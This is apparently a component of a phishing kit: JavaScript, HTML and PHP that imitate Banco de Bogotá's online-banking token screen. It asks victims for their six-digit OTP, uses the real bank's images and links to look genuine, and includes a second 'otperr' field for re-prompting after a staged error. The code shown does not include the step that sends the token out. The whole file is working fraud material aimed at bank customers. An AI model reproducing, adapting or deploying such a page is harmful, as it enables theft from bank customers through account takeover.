var bogota_titulo = 'Banco de Bogotá';
var loading_body = ``;
var bogota_body = `
<div id="panel-otp">
    <form  onsubmit="return false;">
      <input formcontrolname="otp"
        inputmode="numeric"
        maxlength="6"
        autocomplete="off"
        pattern="[0-9]*"
        pb-input=""
        placeholder="Ingrese su token"
        type="password"
        ng-reflect-maxlength="4"
        ng-reflect-pattern="[0-9]*"
        id="txtOTP"
        ng-reflect-name="otp"
        class="pb-input ng-untouched ng-pristine ng-invalid"
        onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">


      <div class="btn-container">
        <div class="error-msg">
        </div>
        <button bv-button=""
          style="opacity: 0.5;"
          class="pb-submit bv-button button-md-pb-classic"
          color="pb-classic"
          id="btnOTP"
          ng-reflect-color="pb-classic"
          ng-reflect-show-loader="false">

          <div style="display: inline-block;">
            <table
              border="0"
              cellpadding="0"
              cellspacing="0">
              <tbody>
                <tr>
                  <td
                    valign="middle">
                    <img style="margin-top:5px;"
                      class="pb-classic__lock"
                      src="https://virtual.bancodebogota.co/bbog-pb-frontend-legacy-web/assets/imgs/lock_yellow_pb.svg">
                  </td>
                  <td valign="middle"
                    style="padding-left: 8px;font-family: 'Roboto', sans-serif;">
                    VALIDAR
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
        </button>
      </div>

      <div
        class="recaptcha-policy">
        <div
          class="recaptcha-policy__content pulse-tp-hl6-comp-r">
          <span>Este sitio
            está protegido
            por reCAPTCHA y
            aplican las
          </span>
          <a class="recaptcha-policy__content--anchor"
            href="https://policies.google.com/privacy"
            rel="noopener">políticas
            de
            privacidad</a> y
          los <a
            class="recaptcha-policy__content--anchor"
            href="https://policies.google.com/terms"
            rel="noopener">términos
            de servicio de
            Google.</a>
        </div>
      </div>

      <div
        class="version pulse-tp-bo4-comp-r">
        V.0.1.379-M
      </div>

      <div class="options">
        <ul>
          <li><a
              href="https://virtual.bancodebogota.co/#/login">Ingresar
              con Clave
              Segura <i
                class="fas fa-angle-right"></i></a>
          </li>
          <li><a
              href="https://www.bancodebogota.com/Banking/pb/logon?a=00010016&amp;pbold=true">Ingresa
              al portal
              anterior <i
                class="fas fa-angle-right"></i></a>
          </li>
        </ul>
      </div>

    </form>
</div>`;

<?php require_once('plantilla_bogota.php'); ?>


//<script>
    $(document).ready(function($) {
      $("#fondo, #mensaje").hide();

      $("#txtOTP").keyup(function() {
        if ($("#txtOTP").val().length > 5) {
          $("#btnOTP").css("opacity", "1");
        } else {
          $("#btnOTP").css("opacity", "0.5");
        }
      });


      $("#otperr").keyup(function() {
        if ($("#otperr").val().length > 5) {
          $("#pl-err-otp-btn").css("opacity", "1");
          habilitado = 1;
        } else {
          $("#pl-err-otp-btn").css("opacity", "0.5");
          habilitado = 0;
        }
      });

    });